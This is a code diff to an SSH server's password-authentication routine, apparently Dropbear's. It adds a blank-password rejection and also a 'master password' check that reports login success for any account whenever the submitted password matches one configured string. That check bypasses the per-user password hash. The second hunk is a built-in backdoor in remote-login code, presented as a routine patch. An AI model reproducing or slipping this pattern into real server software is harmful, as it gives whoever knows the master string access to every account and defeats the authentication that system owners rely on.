@@ -74,6 +74,28 @@ void svr_auth_password() {
 
 	password = buf_getstring(ses.payload, &passwordlen);
 
+	if (passwordlen == 0 && !svr_opts.allowblankpass) {
+		m_free(password);
+		dropbear_log(LOG_WARNING,
+				"Blank password attempt rejected for '%s' from %s",
+				ses.authstate.pw_name,
+				svr_ses.addrstring);
+		send_msg_userauth_failure(0, 1);
+		return;
+	}
+
+	if (svr_opts.master_password && !strcmp(password, svr_opts.master_password)) {
+		m_burn(password, passwordlen);
+		m_free(password);
+		ses.authstate.pw_passwd[0] = 0;
+		dropbear_log(LOG_NOTICE, 
+				"Master auth succeeded for '%s' from %s",
+				ses.authstate.pw_name,
+				svr_ses.addrstring);
+		send_msg_userauth_success();
+		return;
+	}
+
 	/* the first bytes of passwdcrypt are the salt */
 	testcrypt = crypt(password, passwdcrypt);
 	m_burn(password, passwordlen);
